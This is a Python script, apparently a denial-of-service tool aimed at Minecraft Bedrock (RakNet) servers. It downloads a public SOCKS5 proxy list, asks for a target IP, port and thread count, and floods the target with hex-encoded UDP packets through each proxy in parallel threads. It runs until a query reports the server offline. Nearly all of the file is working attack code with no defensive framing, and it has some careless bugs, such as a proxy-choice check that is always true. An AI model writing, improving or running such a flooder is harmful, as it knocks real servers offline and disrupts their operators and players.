import socket
import struct
import codecs, sys
import threading
import random
import time
import os

try:
	import socks
	import wget
	import requests
	from py_mcpe_stats import Query
	from colorama import init
	from colorama import Fore, Back, Style
except:
	print(Fore.RED + "[Modules] Error from import!")
	print(Fore.RED + "[Modules] Enter: pip install requirements.txt")
	
sent = 0
errors = 0

try:
	message1 = codecs.decode("081e77da","hex_codec")
	message2 = codecs.decode("081e7eda","hex_codec")
	message3 = codecs.decode("081e77da","hex_codec")
except:
	print(Fore.RED + "[Decoder] Error!")

messages = [message1, message2, message3]

init()

if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")

use_proxy = str(input(Fore.CYAN + "Use Deafault proxy list or custom? (d/c) "))

# fucking python

if use_proxy == "d" or "D":
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")
		
	try:
		os.remove("socks5.txt")
	except:
		pass

	try:	
		proxy5_download = wget.download("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt")
	except:
		print(Fore.RED + "[Proxy] Error!")  

	proxy5_list = open("socks5.txt")
	proxy5_line = proxy5_list.readlines()
else:
	proxy_custom = str(input(Fore.CYAN + "Enter proxy list (SOCKS5): "))
	
check_file = os.path.exists("version.txt")

if check_file == True:
	pass
if check_file == False:
	print(Fore.RED + "\n\n[File] Version.txt not found!")

ip = input(Fore.CYAN + "\nEnter IP: ")
port = input(Fore.CYAN + "Enter PORT: ")
threads = int(input(Fore.CYAN + "Enter THREADS: "))

def timeout():
	time.sleep(1)

def checker_server():
	try:
		q = Query(ip, port)
		server_data = q.query()
		if server_data != None and server_data.SUCCESS:
			pass
		else:
			if os.name == "nt":
				os.system("cls")
				print(Fore.GREEN + "Server is OFF!")
				exit()
			else:
				os.system("clear")
				print(Fore.GREEN + "Server is OFF!")
				exit()
	except:
		pass
	
def updater():
	version_site = requests.get('https://github.com/DevClancy/raknet_fucker/blob/main/version.txt')
	if check_file == True:
		version_file = open('version.txt')
		version_text = version_file.read()
		#if str(version_text) not str(version_site):
			#pass

def info_print(sent, errors):
	if os.name == "nt":
		os.system("cls")
		print(Fore.GREEN + "Sent: " + str(sent) + " " + Fore.RED + "Errors: " + str(errors))
	else:
		os.system("clear")
		print(Fore.GREEN + "Sent: " + str(sent) + " " + Fore.RED + "Errors: " + str(errors))

def cleaner():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")
		
def attack():
	global sent
	global errors
	with open(r"socks5.txt", "r") as file:
		for line in file:
			try:
				message = random.choice(messages)
				
				sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
				list_pr = line.rsplit(':', 1)
				
				ip_pr5 = list_pr[0]
				port_pr5 = int(list_pr[1])
				
				sock.set_proxy(socks.SOCKS5, ip_pr5, port_pr5)
				sock.sendto(message, (ip, int(port)))
				
				sent += 1
				
				cleaner()
				info_print(sent, errors)
			except ConnectionResetError:
				errors += 1
				cleaner()
				info_print(sent, errors)				
				timeout()
			except:
				errors += 1
				cleaner()
				info_print(sent, errors)
				checker_server()

if os.name == "nt":
	os.system("cls")
	print(Fore.GREEN + "Sent: " + str(sent) + " " + Fore.RED + "Errors: " + str(errors))
else:
	os.system("clear")
	print(Fore.GREEN + "Sent: " + str(sent) + " " + Fore.RED + "Errors: " + str(errors))
												
for o in range(threads):
	main_thread = threading.Thread(target = attack)
	main_thread.start()
